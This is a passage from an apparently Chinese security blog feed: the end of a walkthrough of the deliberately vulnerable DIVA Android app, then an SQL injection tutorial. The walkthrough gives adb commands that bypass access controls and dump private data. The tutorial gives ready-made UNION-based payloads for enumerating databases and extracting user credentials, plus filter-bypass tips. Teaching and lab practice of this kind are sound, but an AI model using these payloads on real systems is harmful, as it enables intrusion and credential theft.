src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220322220539037-533361955.png" alt="image-20220322220539575"></p><p>在<code>SQLInjectionActivity#search</code>，可以看到直接将输入的用户名拼接在SQL语句后面，没有做任何过滤，导致SQL注入的发生。</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220322221226886-308377082.png" alt="image-20220322221227874"></p><h4 id="第八关-输入校验问题-第二部分"><a href="#第八关-输入校验问题-第二部分" class="headerlink" title="第八关 输入校验问题-第二部分"></a>第八关 输入校验问题-第二部分</h4><p>产生原因：在处理转跳时存在漏洞，导致允许从http域跨向file域，实现跨域漏洞，在 File 域下，同源策略跨域访问则能够对私有目录文件进行访问</p><p>输入一段url点击可以看到访问了这个页面</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220322221551589-1756382319.png" alt="image-20220322221552254"></p><p>将https&#x2F;http协议换成File协议，利用file协议读取之前存储在sd卡的账号文件&#x2F;mnt&#x2F;sdcard&#x2F;.uinfo.txt</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220322221937197-860498897.png" alt="image-20220322221937870"></p><p>在<code>InputValidation2URISchemeActivity#get</code>，代码没有对输入的数据进行处理直接loadUrl</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220322222225023-451516831.png" alt="image-20220322222226194"></p><h4 id="第九关-访问控制问题-第一部分"><a href="#第九关-访问控制问题-第一部分" class="headerlink" title="第九关 访问控制问题-第一部分"></a>第九关 访问控制问题-第一部分</h4><p>点击按钮</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220322222520447-960683478.png" alt="image-20220322222521636"></p><p>这里我们要不使用按钮就获取到API凭据，先定位到<code>APICredsActivity</code>类名，</p><p>查看AndroidManifest.XML文件，找到了相关的activity</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220322223823174-167174189.png" alt="image-20220322223824358"></p><p>通过观察代码发现，这个activity设置了intent filter，如果为一个Activity设置了IntentFilter，你就可以在应用内或者其他应用中，用特定的隐式Intent来启动这个Activity，如果没有为Activity设置IntentFilter，那么你就只能通过显示Intent来启动这个Activity。</p><p>adb启动activity组件，输入命令，即可启动APICredsActivity</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">adb shell am start jakhar.aseem.diva/.APICredsActivity</span><br><span class="line">或者</span><br><span class="line">adb shell am start -n jakhar.aseem.diva/.APICredsActivity -a jakhar.aseem.diva.action.VIEW_CREDS</span><br><span class="line">am start: 启动activity 管理工具</span><br><span class="line">-a：指定action</span><br><span class="line">-n：指定完整 component 名</span><br><span class="line">命令详情：https://developer.android.google.cn/studio/command-line/adb#am</span><br></pre></td></tr></table></figure><p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220322224436365-482229719.png" alt="image-20220322224436885"></p><h4 id="第十关-访问控制问题-第二部分"><a href="#第十关-访问控制问题-第二部分" class="headerlink" title="第十关 访问控制问题-第二部分"></a>第十关 访问控制问题-第二部分</h4><p>从题目描述可以知道，通过注册后才能拥有tveeter API Credentials，所以要通过不注册来获取API Credentials</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220322224826718-716123326.png" alt="image-20220322224826794"></p><p>尝试上一关的方式，跳到了一个需要输入PIN的activity，这表明程序做了相应的措施</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220322224932014-1898417047.png" alt="image-20220322224932400"></p><p>查看源码<code>APICreds2Activity</code>，获取到上一个activity传来的boolean值，并当该值为false时就获取到apikey</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220322225415347-1032098981.png" alt="image-20220322225416042"></p><p>查看上一个activity，即<code>AccessControl2Activity</code>，在代码如下位置发现设置的boolean值</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220322230827731-1688194136.png" alt="image-20220322230828762"></p><p>这个类中bool值是通过单选项来决定的，而且把值传给下个activity，这时我们可以使用–ez来传递一个boolean键值对，但是要获取到2131099686值对应的key值是什么，十进制2131099686转换为16进制0x7f060026，在AndroidKiller中搜索0x7f060026</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220322231629730-1116343886.png" alt="image-20220322231629557"></p><p>得到对于的name值为chk_pin，再全局搜索name值，得到key为check_pin</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220322231855197-108821087.png" alt="image-20220322231856128"></p><p>最后adb启动activity命令，成功弹出</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">adb shell am start -a jakhar.aseem.diva.action.VIEW_CREDS2 -n jakhar.aseem.diva/.APICreds2Activity --ez check_pin false</span><br></pre></td></tr></table></figure><p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220322232124534-182093013.png" alt="image-20220322232125667"></p><h4 id="第十一关-访问控制问题-第三部分"><a href="#第十一关-访问控制问题-第三部分" class="headerlink" title="第十一关 访问控制问题-第三部分"></a>第十一关 访问控制问题-第三部分</h4><p>根据题目的描述，这是个私人笔记app，一开始需要设置密码才能使用，现在我们尝试不设置密码就开始使用</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220322232512207-651302979.png" alt="image-20220322232513013"></p><p>定位到类<code>NotesProvider</code>，对应到AndroidManifest.XML文件</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220322233006812-1932681545.png" alt="image-20220322233008111"></p><p>代码如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;provider android:authorities=&quot;jakhar.aseem.diva.provider.notesprovider&quot; android:enabled=&quot;true&quot; android:exported=&quot;true&quot; android:name=&quot;jakhar.aseem.diva.NotesProvider&quot;/&gt;</span><br></pre></td></tr></table></figure><p>这里使用了ContentProvider，android:enabled表示是否能由系统初始化，android:exported表示是否能被其他应用使用，android:authorities标识这个ContentProvider，调用者可以根据这个标识来找到它，看到2个值都为true，我们就可以使用content:&#x2F;&#x2F;访问里面的数据了，查看包含content:&#x2F;&#x2F;的字符串文件&#x2F;smali&#x2F;jakhar&#x2F;aseem&#x2F;diva&#x2F;NotesProvider.smali</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220322234114956-1692793041.png" alt="image-20220322234116133"></p><p>我们可以使用以下命令访问该uri</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">adb shell content query –-uri content://jakhar.aseem.diva.provider.notesprovider/notes</span><br></pre></td></tr></table></figure><p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220322234351285-255533229.png" alt="image-20220322234352521"></p><h4 id="第十二关-硬编码-第二部分"><a href="#第十二关-硬编码-第二部分" class="headerlink" title="第十二关 硬编码-第二部分"></a>第十二关 硬编码-第二部分</h4><p>随便输入</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220322234519154-478736019.png" alt="image-20220322234520188"></p><p>在源码<code>Hardcode2Activity#access</code>，这里使用了DivaJni类</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220322234635543-1098201335.png" alt="image-20220322234636623"></p><p>查看DivaJni类的代码</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220322234838761-1732204680.png" alt="image-20220322234839930"></p><p>这里加载了divajni库，一般库文件都放在&#x2F;lib下，在目录下找到libdivajni.so文件</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220322235156437-1322532202.png" alt="image-20220322235157544"></p><p>linux下可以使用strings查看二进制文件里的字符串</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220322235505226-1937628888.png" alt="image-20220322235505909"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">__cxa_finalize</span><br><span class="line">__cxa_atexit</span><br><span class="line">Java_jakhar_aseem_diva_DivaJni_access</span><br><span class="line">Java_jakhar_aseem_diva_DivaJni_initiateLaunchSequence</span><br><span class="line">strcpy</span><br><span class="line">JNI_OnLoad</span><br><span class="line">_edata</span><br><span class="line">__bss_start</span><br><span class="line">_end</span><br><span class="line">libstdc++.so</span><br><span class="line">libm.so</span><br><span class="line">libc.so</span><br><span class="line">libdl.so</span><br><span class="line">libdivajni.so</span><br><span class="line">&lt;$!H</span><br><span class="line">olsdfgad;lh</span><br><span class="line">.dotdot</span><br><span class="line">;*3$&quot;</span><br><span class="line">GCC: (GNU) 4.9 20140827 (prerelease)</span><br><span class="line">gold 1.11</span><br><span class="line">.shstrtab</span><br><span class="line">.dynsym</span><br><span class="line">.dynstr</span><br><span class="line">.hash</span><br><span class="line">.rela.dyn</span><br><span class="line">.rela.plt</span><br><span class="line">.text</span><br><span class="line">.rodata</span><br><span class="line">.eh_frame</span><br><span class="line">.eh_frame_hdr</span><br><span class="line">.fini_array</span><br><span class="line">.init_array</span><br><span class="line">.dynamic</span><br><span class="line">.got</span><br><span class="line">.got.plt</span><br><span class="line">.data</span><br><span class="line">.bss</span><br><span class="line">.comment</span><br><span class="line">.note.gnu.gold-version</span><br></pre></td></tr></table></figure><p>逐个尝试，得到<code>olsdfgad;lh</code></p><p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220322235832847-2033031412.png" alt="image-20220322235833870"></p><h4 id="第十三关-输入校验问题-第三部分"><a href="#第十三关-输入校验问题-第三部分" class="headerlink" title="第十三关 输入校验问题-第三部分"></a>第十三关 输入校验问题-第三部分</h4><p>随便试试</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220322235939256-2038808093.png" alt="image-20220322235939860"></p><p>当输入长的数据时，程序崩溃了，应该是缓冲区溢出了</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220323000316997-96476980.png" alt="image-20220323000317916"></p><p>查看源码<code>InputValidation3Activity#push</code></p><p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220323000834795-1107643338.png" alt="image-20220323000835749"></p><p>查看该类的源码<a href="https://github.com/payatu/diva-android/blob/master/app/src/main/jni/divajni.c%EF%BC%8C%E4%BD%BF%E7%94%A8%E7%9A%84%E6%98%AFstrcpy%EF%BC%8C%E5%85%B8%E5%9E%8B%E7%9A%84%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%A4%8D%E5%88%B6%E6%BA%A2%E5%87%BA">https://github.com/payatu/diva-android/blob/master/app/src/main/jni/divajni.c，使用的是strcpy，典型的字符串复制溢出</a></p><p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220323001417565-1536880141.png" alt="image-20220323001418193"></p><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="https://mp.weixin.qq.com/s/DmonezeCfUdx5_Bzr1lFuw">https://mp.weixin.qq.com/s/DmonezeCfUdx5_Bzr1lFuw</a></p>]]></content>
    
    
    <summary type="html">&lt;meta name=&quot;referrer&quot; content=&quot;no-referrer&quot;/&gt;

&lt;h3 id=&quot;DIVA简介&quot;&gt;&lt;a href=&quot;#DIVA简介&quot; class=&quot;headerlink&quot; title=&quot;DIVA简介&quot;&gt;&lt;/a&gt;DIVA简介&lt;/h3&gt;&lt;p&gt;DIVA（该死的不安全和易受攻击的应用程序）是故意设计的存在很多漏洞的Android app。&lt;/p&gt;</summary>
    
    
    
    <category term="渗透测试" scheme="https://kpa1on.github.io/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
    <category term="APP" scheme="https://kpa1on.github.io/tags/APP/"/>
    
  </entry>
  
  <entry>
    <title>SQL注入学习</title>
    <link href="https://kpa1on.github.io/2022/03/22/SQL%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/"/>
    <id>https://kpa1on.github.io/2022/03/22/SQL%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/</id>
    <published>2022-03-22T07:31:41.000Z</published>
    <updated>2022-03-22T09:45:42.938Z</updated>
    
    <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"/><h2 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h2><span id="more"></span><h3 id="系统函数"><a href="#系统函数" class="headerlink" title="系统函数"></a>系统函数</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">system_user()——系统用户名</span><br><span class="line">user()——用户名</span><br><span class="line">current_user()——当前用户名</span><br><span class="line">session_user()——链接数据库的用户名</span><br><span class="line">database()——数据库名</span><br><span class="line">version()——数据库版本</span><br><span class="line">@@datadir——数据库路径</span><br><span class="line">@@basedir——数据库安装路径</span><br><span class="line">@@version_conpile_os——操作系统</span><br></pre></td></tr></table></figure><h3 id="数学函数"><a href="#数学函数" class="headerlink" title="数学函数"></a>数学函数</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">ABS(x)   返回x的绝对值</span><br><span class="line">BIN(x)   返回x的二进制（OCT返回八进制，HEX返回十六进制）</span><br><span class="line">CEILING(x)   返回大于x的最小整数值</span><br><span class="line">EXP(x)   返回值e（自然对数的底）的x次方</span><br><span class="line">FLOOR(x)   返回小于x的最大整数值</span><br><span class="line">GREATEST(x1,x2,...,xn)返回集合中最大的值</span><br><span class="line">LEAST(x1,x2,...,xn)      返回集合中最小的值</span><br><span class="line">LN(x)                    返回x的自然对数</span><br><span class="line">LOG(x,y)返回x的以y为底的对数</span><br><span class="line">MOD(x,y)                 返回x/y的模（余数）</span><br><span class="line">PI()返回pi的值（圆周率）</span><br><span class="line">RAND()返回０到１内的随机值,可以通过提供一个参数(种子)使RAND()随机数生成器生成一个指定的值。</span><br><span class="line">ROUND(x,y)返回参数x的四舍五入的有y位小数的值</span><br><span class="line">SIGN(x) 返回代表数字x的符号的值</span><br><span class="line">SQRT(x) 返回一个数的平方根</span><br><span class="line">TRUNCATE(x,y)            返回数字x截短为y位小数的结果</span><br></pre></td></tr></table></figure><h3 id="聚合函数"><a href="#聚合函数" class="headerlink" title="聚合函数"></a>聚合函数</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">AVG(col)返回指定列的平均值</span><br><span class="line">COUNT(col)返回指定列中非NULL值的个数</span><br><span class="line">MIN(col)返回指定列的最小值</span><br><span class="line">MAX(col)返回指定列的最大值</span><br><span class="line">SUM(col)返回指定列的所有值之和</span><br><span class="line">GROUP_CONCAT(col) 返回由属于一组的列值连接组合而成的结果</span><br></pre></td></tr></table></figure><h3 id="字符串函数"><a href="#字符串函数" class="headerlink" title="字符串函数"></a>字符串函数</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">ASCII(char)返回字符的ASCII码值</span><br><span class="line">BIT_LENGTH(str)返回字符串的比特长度</span><br><span class="line">CONCAT(s1,s2...,sn)将s1,s2...,sn连接成字符串</span><br><span class="line">CONCAT_WS(sep,s1,s2...,sn)将s1,s2...,sn连接成字符串，并用sep字符间隔</span><br><span class="line">INSERT(str,x,y,instr) 将字符串str从第x位置开始，y个字符长的子串替换为字符串instr，返回结果</span><br><span class="line">FIND_IN_SET(str,list)分析逗号分隔的list列表，如果发现str，返回str在list中的位置</span><br><span class="line">LCASE(str)或LOWER(str) 返回将字符串str中所有字符改变为小写后的结果</span><br><span class="line">LEFT(str,x)返回字符串str中最左边的x个字符</span><br><span class="line">LENGTH(s)返回字符串str中的字符数</span><br><span class="line">LTRIM(str) 从字符串str中切掉开头的空格</span><br><span class="line">POSITION(substr,str) 返回子串substr在字符串str中第一次出现的位置</span><br><span class="line">QUOTE(str) 用反斜杠转义str中的单引号</span><br><span class="line">REPEAT(str,srchstr,rplcstr)返回字符串str重复x次的结果</span><br><span class="line">REVERSE(str) 返回颠倒字符串str的结果</span><br><span class="line">RIGHT(str,x) 返回字符串str中最右边的x个字符</span><br><span class="line">RTRIM(str) 返回字符串str尾部的空格</span><br><span class="line">STRCMP(s1,s2)比较字符串s1和s2</span><br><span class="line">TRIM(str)去除字符串首部和尾部的所有空格</span><br><span class="line">UCASE(str)或UPPER(str) 返回将字符串str中所有字符转变为大写后的结果</span><br></pre></td></tr></table></figure><h3 id="加密函数"><a href="#加密函数" class="headerlink" title="加密函数"></a>加密函数</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">AES_ENCRYPT(str,key)  返回用密钥key对字符串str利用高级加密标准算法加密后的结果，调用AES_ENCRYPT的结果是一个二进制字符串，以BLOB类型存储</span><br><span class="line">AES_DECRYPT(str,key)  返回用密钥key对字符串str利用高级加密标准算法解密后的结果</span><br><span class="line">DECODE(str,key)   使用key作为密钥解密加密字符串str</span><br><span class="line">ENCRYPT(str,salt)   使用UNIXcrypt()函数，用关键词salt(一个可以惟一确定口令的字符串，就像钥匙一样)加密字符串str</span><br><span class="line">ENCODE(str,key)   使用key作为密钥加密字符串str，调用ENCODE()的结果是一个二进制字符串，它以BLOB类型存储</span><br><span class="line">MD5()    计算字符串str的MD5校验和</span><br><span class="line">PASSWORD(str)   返回字符串str的加密版本，这个加密过程是不可逆转的，和UNIX密码加密过程使用不同的算法。</span><br><span class="line">SHA()    计算字符串str的安全散列算法(SHA)校验和</span><br></pre></td></tr></table></figure><h2 id="注入流程"><a href="#注入流程" class="headerlink" title="注入流程"></a>注入流程</h2><h3 id="1-判断是否存在注入"><a href="#1-判断是否存在注入" class="headerlink" title="1.判断是否存在注入"></a>1.判断是否存在注入</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; </span><br><span class="line">?id=1&quot; </span><br><span class="line">?id=1&#x27;) </span><br><span class="line">?id=1&quot;) </span><br><span class="line">?id=1&#x27; or 1#</span><br><span class="line">?id=1&#x27; or 0#</span><br><span class="line">?id=1&#x27; or 1=1#</span><br><span class="line">?id=1&#x27; and 1=2#</span><br><span class="line">?id=1&#x27; and sleep(5)#</span><br><span class="line">?id=1&#x27; and 1=2 or &#x27; </span><br><span class="line">?id=1\</span><br></pre></td></tr></table></figure><h3 id="2-判断字段数"><a href="#2-判断字段数" class="headerlink" title="2.判断字段数"></a>2.判断字段数</h3><p>使用 order&#x2F;group by 语句，通过往后边拼接数字指导页面报错，可确定字段数量。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; order by 1#</span><br><span class="line">1&#x27; order by 2#</span><br><span class="line">1&#x27; order by 3#</span><br><span class="line">1 order by 1</span><br><span class="line">1 order by 2</span><br><span class="line">1 order by 3</span><br></pre></td></tr></table></figure><p>使用 union select 联合查询，不断在 union select 后面加数字，直到不报错，即可确定字段数量。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; union select 1#</span><br><span class="line">1&#x27; union select 1,2#</span><br><span class="line">1&#x27; union select 1,2,3#</span><br><span class="line">1 union select 1#</span><br><span class="line">1 union select 1,2#</span><br><span class="line">1 union select 1,2,3#</span><br></pre></td></tr></table></figure><h3 id="3-确定显示数据的字段位置"><a href="#3-确定显示数据的字段位置" class="headerlink" title="3.确定显示数据的字段位置"></a>3.确定显示数据的字段位置</h3><p>使用 union select 1,2,3,4,… 根据回显的字段数，判断回显数据的字段位置。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27; union select 1#</span><br><span class="line">-1&#x27; union select 1,2#</span><br><span class="line">-1&#x27; union select 1,2,3#</span><br><span class="line">-1 union select 1#</span><br><span class="line">-1 union select 1,2#</span><br><span class="line">-1 union select 1,2,3#</span><br></pre></td></tr></table></figure><h3 id="4-在回显数据的字段上注入payload"><a href="#4-在回显数据的字段上注入payload" class="headerlink" title="4.在回显数据的字段上注入payload"></a>4.在回显数据的字段上注入payload</h3><p>在mysql 5.0版本之后，mysql默认在数据库中存放一个”<code>information_schema</code>“的数据库，在该库中，需要记住三个表名，分别是schemata、tables、columns。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">数据库名</span><br><span class="line">-1&#x27; union select 1,2,database()--+</span><br><span class="line">-1&#x27; union select 1,2,group_concat(schema_name) from information_schema.schemata--+</span><br><span class="line">表名</span><br><span class="line">-1&#x27; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()--+</span><br><span class="line">字段名</span><br><span class="line">-1&#x27; union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27;--+</span><br><span class="line">数据</span><br><span class="line">-1&#x27; union select 1,2,group_concat(id,0x7c,username,0x7c,password) from users--+</span><br></pre></td></tr></table></figure><p>当<code>information_schema</code>被屏蔽时，可以使用其他表：</p><p><strong>innodb表</strong></p><p>MySQL 5.6 及以上版本存在<code>innodb_index_stats</code>，<code>innodb_table_stats</code>两张表，其中包含新建立的库和表</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">查表</span><br><span class="line">select table_name from mysql.innodb_table_stats where database_name = database(); </span><br><span class="line">select table_name from mysql.innodb_index_stats where database_name = database();</span><br><span class="line">-1&#x27; union select 1,2,group_concat(table_name) from mysql.innodb_table_stats where database_name=schema()--+</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>sys表</strong></p><p>sys表 在MySQL 5.7中默认存在，在mysql5.6版本以上可以手动导入，sys系统数据库结合了information_schema和performance_schema的相关数据。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">#包含in</span><br><span class="line">SELECT object_name FROM `sys`.`x$innodb_buffer_stats_by_table` where object_schema = database();</span><br><span class="line">SELECT object_name FROM `sys`.`innodb_buffer_stats_by_table` WHERE object_schema = DATABASE();</span><br><span class="line">SELECT TABLE_NAME FROM `sys`.`x$schema_index_statistics` WHERE TABLE_SCHEMA = DATABASE();</span><br><span class="line">SELECT TABLE_NAME FROM `sys`.`schema_auto_increment_columns` WHERE TABLE_SCHEMA = DATABASE();</span><br><span class="line">SELECT table_schema FROM sys.schema_table_statistics GROUP BY table_schema;</span><br><span class="line">#不包含in</span><br><span class="line">SELECT TABLE_NAME FROM `sys`.`x$schema_flattened_keys` WHERE TABLE_SCHEMA = DATABASE();</span><br><span class="line">SELECT TABLE_NAME FROM `sys`.`x$ps_schema_table_statistics_io` WHERE TABLE_SCHEMA = DATABASE();</span><br><span class="line">SELECT TABLE_NAME FROM `sys`.`x$schema_table_statistics_with_buffer` WHERE TABLE_SCHEMA = DATABASE();</span><br><span class="line">SELECT table_schema FROM sys.x$schema_flattened_keys GROUP BY table_schema;</span><br><span class="line">#通过表文件的存储路径获取表名</span><br><span class="line">SELECT FILE FROM `sys`.`io_global_by_file_by_bytes` WHERE FILE REGEXP DATABASE();</span><br><span class="line">SELECT FILE FROM `sys`.`io_global_by_file_by_latency` WHERE FILE REGEXP DATABASE();</span><br><span class="line">SELECT FILE FROM `sys`.`x$io_global_by_file_by_bytes` WHERE FILE REGEXP DATABASE();</span><br><span class="line"></span><br><span class="line">#查询指定库的表（若无则说明此表从未被访问）</span><br><span class="line">SELECT table_name FROM sys.schema_table_statistics WHERE table_schema=&#x27;mspwd&#x27; GROUP BY table_name;</span><br><span class="line">SELECT table_name FROM sys.x$schema_flattened_keys WHERE table_schema=&#x27;mspwd&#x27; GROUP BY table_name;</span><br><span class="line">#统计所有访问过的表次数:库名,表名,访问次数</span><br><span class="line">select table_schema,table_name,sum(io_read_requests+io_write_requests) io from sys.schema_table_statistics group by</span><br><span class="line">table_schema,table_name order by io desc;</span><br><span class="line">#查看所有正在连接的用户详细信息</span><br><span class="line">SELECT user,db,command,current_statement,last_statement,time FROM sys.session;</span><br><span class="line">#查看所有曾连接数据库的IP,总连接次数</span><br><span class="line">SELECT host,total_connections FROM sys.host_summary;</span><br></pre></td></tr></table></figure><p><strong>Performance Schema</strong></p><p>Performance Schema最早在MYSQL 5.5中引入，而现在5.6、5.7、8.0中Performance-Schema又添加了更多的监控项，用于监控MySQL server在一个较低级别的运行过程中的资源消耗、资源等待等情况。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">SELECT object_name FROM `performance_schema`.`objects_summary_global_by_type` WHERE object_schema = DATABASE();</span><br><span class="line">SELECT object_name FROM `performance_schema`.`table_handles` WHERE object_schema = DATABASE();</span><br><span class="line">SELECT object_name FROM `performance_schema`.`table_io_waits_summary_by_index_usage` WHERE object_schema = DATABASE();</span><br><span class="line">SELECT object_name FROM `performance_schema`.`table_io_waits_summary_by_table` WHERE object_schema = DATABASE();</span><br><span class="line">SELECT object_name FROM `performance_schema`.`table_lock_waits_summary_by_table` WHERE object_schema = DATABASE();</span><br></pre></td></tr></table></figure><h2 id="过滤"><a href="#过滤" class="headerlink" title="过滤"></a>过滤</h2><h3 id="select被过滤"><a href="#select被过滤" class="headerlink" title="select被过滤"></a>select被过滤</h3><p>方法一：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql 8.0.19`新增语句`table</span><br><span class="line">TABLE table_name [ORDER BY column_name] [LIMIT number [OFFSET number]]</span><br><span class="line"></span><br><span class="line">可以把table t简单理解成select * from t，和select的区别在于</span><br><span class="line">table总是显示表的所有列</span><br><span class="line">table不允许任何的行过滤;也就是说，TABLE不支持任何WHERE子句。</span><br><span class="line">可以用来盲注表名</span><br></pre></td></tr></table></figure><p>方法二：</p><figure class="highlight 